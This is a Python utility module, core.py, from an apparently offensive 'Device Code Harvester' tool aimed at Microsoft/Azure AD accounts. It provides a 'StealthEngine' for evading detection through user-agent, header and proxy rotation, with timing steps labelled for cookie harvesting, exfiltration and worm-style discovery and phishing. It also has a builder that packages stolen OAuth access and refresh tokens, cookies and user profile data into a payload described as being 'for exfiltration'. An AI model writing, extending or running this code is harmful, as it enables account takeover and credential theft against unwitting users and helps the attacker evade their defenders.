#!/usr/bin/env python3
# core.py - Shared utilities for the Device Code Harvester
# Provides: CryptoUtils, StealthEngine, JWT helpers, session payload builder
# Updated with enhanced logger integration

import os
import sys
import json
import time
import base64
import hashlib
import random
import functools
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote

import requests

# Import enhanced logger
from logger import get_logger
# Proxy manager for centralized rotation
from proxy_manager import get_next_proxy, get_all_proxies, load_proxies_from_env_or_file, get_proxy_count

# Initialize logger for this module
logger = get_logger('core')

# -------------------- CRYPTOGRAPHY --------------------
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_AVAILABLE = True
except ImportError:
    AESGCM = None
    CRYPTO_AVAILABLE = False
    logger.warning("cryptography not installed, AES encryption will be unavailable")

class CryptoUtils:
    """Cryptographic utilities for AES-256-GCM encryption/decryption."""
    
    @staticmethod
    def generate_key() -> bytes:
        """Generate a secure random 32-byte key for AES-256-GCM."""
        key = os.urandom(32)
        logger.debug(f"Generated new encryption key: {key.hex()[:16]}...")
        return key

    @staticmethod
    def aes_gcm_encrypt(key: bytes, plaintext: bytes, aad: bytes = b"") -> Tuple[bytes, bytes]:
        """Encrypt plaintext using AES-256-GCM. Returns (nonce, ciphertext)."""
        if not CRYPTO_AVAILABLE or AESGCM is None:
            raise RuntimeError("cryptography library not installed")
        
        aesgcm = AESGCM(key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext, aad)
        logger.debug(f"Encrypted {len(plaintext)} bytes with nonce {nonce.hex()[:8]}...")
        return nonce, ciphertext

    @staticmethod
    def aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext: bytes, aad: bytes = b"") -> bytes:
        """Decrypt ciphertext using AES-256-GCM."""
        if not CRYPTO_AVAILABLE or AESGCM is None:
            raise RuntimeError("cryptography library not installed")
        
        aesgcm = AESGCM(key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, aad)
        logger.debug(f"Decrypted {len(ciphertext)} bytes successfully")
        return plaintext

    @staticmethod
    def b64_encode(data: bytes) -> str:
        """Base64 encode bytes to string."""
        encoded = base64.b64encode(data).decode('utf-8')
        return encoded

    @staticmethod
    def b64_decode(data: str) -> bytes:
        """Base64 decode string to bytes."""
        return base64.b64decode(data)
    
    @staticmethod
    def b64_url_encode(data: bytes) -> str:
        """Base64 URL-safe encode bytes to string."""
        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')
    
    @staticmethod
    def b64_url_decode(data: str) -> bytes:
        """Base64 URL-safe decode string to bytes."""
        # Add padding if necessary
        data += '=' * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(data)

# -------------------- STEALTH ENGINE --------------------
class StealthEngine:
    """
    Stealth engine for evading detection:
    - Random User-Agent rotation
    - Proxy rotation (from list)
    - Jitter (random delays) per operation type
    - Request fingerprint randomization
    """
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]
    
    # Additional headers to randomize for better stealth
    ACCEPT_LANGUAGES = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-US,en;q=0.9,fr;q=0.8', 'en;q=0.9,es;q=0.8']
    ACCEPT_ENCODINGS = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip, deflate']
    SEC_CH_UA_PLATFORMS = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
    
    def __init__(self, proxy_list: Optional[List[str]] = None, min_jitter: float = 1.0, max_jitter: float = 3.5, use_manager_proxy: bool = True):
        """
        Initialize stealth engine.
        
        Args:
            proxy_list: List of proxy URLs (e.g., ['http://user:pass@proxy1:8080', ...])
            min_jitter: Minimum jitter delay in seconds
            max_jitter: Maximum jitter delay in seconds
        """
        # If proxy_list is None, attempt to load from the centralized proxy manager/file.
        # If proxy_list is explicitly provided (including empty list) we respect it.
        self.use_manager_proxy = bool(use_manager_proxy)

        if proxy_list is None:
            # Ensure proxy_manager has loaded proxies from env or proxy.txt
            try:
                _proxy_file = Path(__file__).resolve().parents[1] / 'proxy.txt'
                load_proxies_from_env_or_file('PROXY_LIST', str(_proxy_file))
            except Exception:
                pass
            proxy_list = get_all_proxies() or []

        self.proxy_list = proxy_list
        self.proxy_index = 0
        self.min_jitter = min_jitter
        self.max_jitter = max_jitter
        self._session_count = 0
        
        if self.proxy_list:
            logger.proxy(f"Loaded {len(self.proxy_list)} proxies for rotation")
        else:
            logger.proxy("No proxies configured - using direct connections")

    def random_ua(self) -> str:
        """Return a random User-Agent string."""
        ua = random.choice(self.USER_AGENTS)
        return ua
    
    def random_headers(self) -> Dict[str, str]:
        """Generate random HTTP headers for better stealth."""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(self.ACCEPT_LANGUAGES),
            'Accept-Encoding': random.choice(self.ACCEPT_ENCODINGS),
            'Connection': random.choice(['keep-alive', 'close']),
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
        }

    def jitter(self, step_type: str = 'default'):
        """
        Apply a random sleep delay based on operation type.
        
        Step types:
            'device_code': Base 0.5 seconds
            'poll': Base 1.0 seconds
            'cookie_harvest': Base 2.0 seconds
            'exfil': Base 3.0 seconds
            'worm_discovery': Base 3.0 seconds
            'worm_phish': Base 5.0 seconds
        """
        base_map = {
            'device_code': 0.5,
            'poll': 1.0,
            'cookie_harvest': 2.0,
            'exfil': 3.0,
            'worm_discovery': 3.0,
            'worm_phish': 5.0,
        }
        base = base_map.get(step_type, 1.0)
        
        # Add more variation for better stealth
        variation = random.uniform(0.5, 1.5)
        delay = base * variation
        
        # Occasionally add longer delay (5% chance) to mimic human behavior
        if random.random() < 0.05:
            delay += random.uniform(5, 20)
            logger.debug(f"Extended jitter applied: +{delay:.2f}s")
        
        if delay > 0.1:
            time.sleep(delay)

    def _get_proxy(self) -> Optional[Dict[str, str]]:
        """Get the next proxy in rotation."""
        # Prefer centralized proxy manager rotation if available
        try:
            logger.debug(f"StealthEngine proxy selection: use_manager_proxy={self.use_manager_proxy}, proxy_list_len={len(self.proxy_list)}")
            proxy_url = None

            # If manager rotation is enabled, ask the manager first
            if self.use_manager_proxy:
                proxy_url = get_next_proxy()
                logger.debug(f"Manager-provided proxy_url={proxy_url}")

            # If manager didn't provide a proxy (or manager disabled), fall back to local list
            if not proxy_url and self.proxy_list:
                # Use local rotation
                self.proxy_index = (self.proxy_index + 1) % len(self.proxy_list)
                proxy_url = self.proxy_list[self.proxy_index]
                logger.debug(f"Local rotation proxy_url={proxy_url}")

            if not proxy_url:
                logger.debug("No proxy selected - using direct connection")
                return None

            return {"http": proxy_url, "https": proxy_url}
        except Exception as exc:
            logger.warning(f"Proxy selection failed: {exc}")
            # On error, attempt local rotation as a final fallback
            if self.proxy_list:
                self.proxy_index = (self.proxy_index + 1) % len(self.proxy_list)
                proxy_url = self.proxy_list[self.proxy_index]
                logger.debug(f"Exception fallback local proxy_url={proxy_url}")
                return {"http": proxy_url, "https": proxy_url}
            return None

    def update_proxy_list(self, proxy_list: Optional[List[str]] = None):
        """Update the proxy list at runtime. If proxy_list is None, re-read from environment."""
        if proxy_list is None:
            # Ask proxy_manager to reload from env or proxy.txt
            try:
                _proxy_file = Path(__file__).resolve().parents[1] / 'proxy.txt'
                load_proxies_from_env_or_file('PROXY_LIST', str(_proxy_file))
                proxy_list = get_all_proxies()
            except Exception:
                proxy_list_env = os.environ.get('PROXY_LIST')
                if proxy_list_env:
                    proxy_list = [p.strip() for p in proxy_list_env.split(',') if p.strip()]
                else:
                    proxy_list = []

        self.proxy_list = proxy_list
        self.proxy_index = 0
        if self.proxy_list:
            logger.proxy(f"Updated proxy list at runtime: {len(self.proxy_list)} proxies (manager reports {get_proxy_count()})")
        else:
            logger.proxy("Cleared proxy list at runtime - using direct connections")

    def build_session(self) -> requests.Session:
        """
        Build a requests Session with random User-Agent, custom headers, and optional proxy.
        """
        self._session_count += 1
        sess = requests.Session()
        sess.trust_env = False
        
        # Set random User-Agent and headers
        headers = self.random_headers()
        headers['User-Agent'] = self.random_ua()
        sess.headers.update(headers)
        
        # Configure proxy if available
        proxy = self._get_proxy()
        # Track last selected proxy on the engine for callers to inspect
        self._last_selected_proxy = None
        if proxy:
            sess.proxies.update(proxy)
            proxy_url = proxy.get('http')
            self._last_selected_proxy = proxy_url
            logger.proxy(f"Session {self._session_count} using proxy: {proxy_url}")
        else:
            self._last_selected_proxy = None
            logger.proxy(f"Session {self._session_count} using direct connection")
        
        # Prevent environment proxy values from interfering with configured proxies
        sess.trust_env = False

        # Configure default request timeouts for all requests made via this session
        sess.request = functools.partial(sess.request, timeout=(10, 30))

        # Disable SSL verification if needed (for testing only)
        if os.environ.get('DISABLE_SSL_VERIFY', '').lower() == 'true':
            sess.verify = False
            logger.warning("SSL verification disabled - insecure!")
        
        return sess
    
    def get_stats(self) -> Dict:
        """Get stealth engine statistics."""
        return {
            'session_count': self._session_count,
            'proxy_count': len(self.proxy_list),
            'proxy_rotation_index': self.proxy_index,
            'user_agent_pool_size': len(self.USER_AGENTS),
        }

# -------------------- JWT UTILITIES --------------------
def decode_jwt(token: str) -> Optional[Dict]:
    """
    Decode a JWT token payload (without signature verification).
    
    Args:
        token: JWT token string (3 parts separated by dots)
    
    Returns:
        Decoded payload as dict, or None if decoding fails
    """
    try:
        parts = token.split('.')
        if len(parts) != 3:
            logger.debug(f"Invalid JWT format: expected 3 parts, got {len(parts)}")
            return None
        
        payload = parts[1]
        # Add padding if necessary
        payload += '=' * (4 - len(payload) % 4)
        decoded = json.loads(base64.urlsafe_b64decode(payload))
        
        # Log interesting claims
        if 'tid' in decoded:
            logger.debug(f"JWT tenant ID: {decoded['tid']}")
        if 'upn' in decoded:
            logger.debug(f"JWT UPN: {decoded['upn']}")
        if 'roles' in decoded:
            logger.debug(f"JWT roles: {decoded['roles']}")
        
        return decoded
    except Exception as e:
        logger.debug(f"JWT decode failed: {e}")
        return None

def validate_jwt(token: str, expected_issuer: str = None) -> bool:
    """
    Basic JWT validation (checks expiration and issuer if provided).
    
    Args:
        token: JWT token string
        expected_issuer: Expected issuer (optional)
    
    Returns:
        True if token is valid, False otherwise
    """
    try:
        payload = decode_jwt(token)
        if not payload:
            return False
        
        # Check expiration
        exp = payload.get('exp')
        if exp:
            exp_time = datetime.fromtimestamp(exp, tz=timezone.utc)
            if exp_time < datetime.now(timezone.utc):
                logger.debug(f"JWT expired at {exp_time}")
                return False
        
        # Check issuer if specified
        if expected_issuer:
            iss = payload.get('iss')
            if iss != expected_issuer:
                logger.debug(f"JWT issuer mismatch: {iss} vs {expected_issuer}")
                return False
        
        return True
    except Exception as e:
        logger.debug(f"JWT validation failed: {e}")
        return False

# -------------------- SESSION PAYLOAD BUILDER --------------------
def build_session_payload(token_data: dict, cookies: List[Dict],
                          user_info: Dict, client_id: str, tenant: str,
                          metadata: dict = None) -> dict:
    """
    Build the complete session payload for exfiltration.
    
    Args:
        token_data: OAuth token response (access_token, refresh_token, id_token, etc.)
        cookies: List of harvested cookies
        user_info: User information from Graph API
        client_id: Azure AD client ID used
        tenant: Tenant used
        metadata: Additional metadata (operator, hostname, etc.)
    
    Returns:
        Complete session payload as dict
    """
    access_token = token_data.get('access_token', '')
    id_token = token_data.get('id_token', '')
    jwt_claims = {}
    
    if id_token:
        jwt_claims['id_token'] = decode_jwt(id_token)
        logger.token("ID token decoded successfully")
    
    if access_token:
        jwt_claims['access_token'] = decode_jwt(access_token)
        logger.token("Access token decoded successfully")
    
    # Build the complete payload
    payload = {
        'version': '2.0',
        'capture_timestamp': datetime.now(timezone.utc).isoformat(),
        'client_id': client_id,
        'tenant': tenant,
        'tokens': {
            'access_token': access_token,
            'refresh_token': token_data.get('refresh_token', ''),
            'id_token': id_token,
            'expires_in': token_data.get('expires_in', 0),
            'token_type': token_data.get('token_type', ''),
            'scope': token_data.get('scope', ''),
        },
        'jwt_claims': jwt_claims,
        'user': {
            'upn': user_info.get('userPrincipalName', ''),
            'display_name': user_info.get('displayName', ''),
            'email': user_info.get('mail', ''),
            'job_title': user_info.get('jobTitle', ''),
            'tenant_id': user_info.get('tenantId', ''),
            'user_id': user_info.get('id', ''),
            'office_location': user_info.get('officeLocation', ''),
        },
        'cookies': cookies,
        'cookie_count': len(cookies),
        'metadata': metadata or {},
    }
    
    logger.info(f"Built session payload: {payload['user']['upn']} | {payload['cookie_count']} cookies")
    return payload

# -------------------- UTILITY FUNCTIONS --------------------
def safe_json_loads(data: str, default: any = None) -> any:
    """Safely load JSON data with error handling."""
    try:
        return json.loads(data)
    except json.JSONDecodeError as e:
        logger.error(f"JSON decode error: {e}")
        return default

def safe_json_dumps(data: any, indent: int = None) -> str:
    """Safely dump JSON data with error handling."""
    try:
        return json.dumps(data, indent=indent, default=str)
    except Exception as e:
        logger.error(f"JSON encode error: {e}")
        return str(data)

def truncate_string(s: str, max_length: int = 100) -> str:
    """Truncate a string to max_length and add ellipsis if needed."""
    if len(s) <= max_length:
        return s
    return s[:max_length] + "..."

def get_timestamp() -> str:
    """Get current timestamp in ISO format."""
    return datetime.now(timezone.utc).isoformat()

# -------------------- EXPORTS --------------------
__all__ = [
    'CryptoUtils',
    'StealthEngine',
    'decode_jwt',
    'validate_jwt',
    'build_session_payload',
    'safe_json_loads',
    'safe_json_dumps',
    'truncate_string',
    'get_timestamp',
    'logger',
    'CRYPTO_AVAILABLE',
]